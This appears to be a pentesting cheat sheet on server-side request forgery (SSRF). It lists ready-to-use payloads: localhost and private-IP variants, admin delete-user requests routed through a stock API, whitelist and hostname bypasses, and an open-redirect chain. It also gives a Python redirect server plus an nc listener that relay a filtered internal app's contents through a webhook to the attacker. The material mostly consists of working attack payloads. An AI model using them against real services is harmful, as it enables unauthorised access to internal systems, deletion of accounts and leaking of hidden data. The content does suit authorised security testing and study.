---
title: Server-Side Request Forgery (SSRF)
desc: 
tags: [SSRF, Web, Webhook]
alts: []
render_with_liquid: false
---

## Capture Tools

If you want to capture the SSRF affections, there are some online tools available for capturing SSRF.

- **[Webhook.site](https://webhook.site/){:target="_blank"}{:rel="noopener"}**

- **[pingb.in](http://pingb.in/){:target="_blank"}{:rel="noopener"}**

<br />

## Basic Methodology

- **Localhost**

    ```html
    POST /stock HTTP/1.1
    ...

    stockApi=http://localhost/
    ```

    The followings are alternatives for localhost.

    ```
    stockApi=http://127.0.0.1/
    stockApi=http://2130706433/
    stockApi=http://017700000001/
    stockApi=http://127.1/
    ```

    - **Operation as Administrator**

        ```
        stockApi=http://localhost/admin
        stockApi=http://localhost/admin/delete?username=john

        stockApi=http://127.1/%25%36%31dmin
        ```

- **Backund URL (192.168.0.X)**

    ```
    stockApi=http://192.168.0.23/admin
    stockApi=http://192.168.0.68:8080/admin/delete?username=michael
    ```

- **Bypass Whitelisted URL**

    ```
    stockApi=http://localhost@vulnerable.com/
    stockApi=http://localhost%25%32%33@vulnerable.com/
    ```

- **Open Redirect**

    ```
    stockApi=/post/next?path=http://localhost/admin
    ```

- **Bypass Hostname**

    1. **Add Target Domain to /etc/hosts in Local Machine**

        ```sh
        <target-ip> sub.vulnerable.com
        ```

        Restart hostnamed

        ```sh
        sudo systemctl restart systemd-hostnamed
        ```

    2. **Access to the Domain You Specified**

        ```
        https://vulnerable.com/?proxy=https://sub.vulnerable.com
        ```

<br />

## Reveal Filtered Websites via Monitoring Tools (Webhook)

Some web apps may have monitoring tools that check the health of external websites.  
You may be able to reveal hidden contents of the target via the monitor.  
First off, create a redirect server using Python. Here it’s named “redirect.py”.

```py
#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 8000), Redirect).serve_forever()
```

After creating, run the following command.  
Assume that the filtered port is 3000 (nmap will reveal it).

```sh
python3 redirect.py http://127.0.0.1:3000
```

And start listener for receiving the POST request of the webhook from the target website.

```sh
nc -lvnp 4444
```

Now set the configuration of the webhook. For example:

```
Payload URL: http://<local-ip>:4444/
Monitored URL: http://<local-ip>:8000/
```

You can see the contents of the filtered app.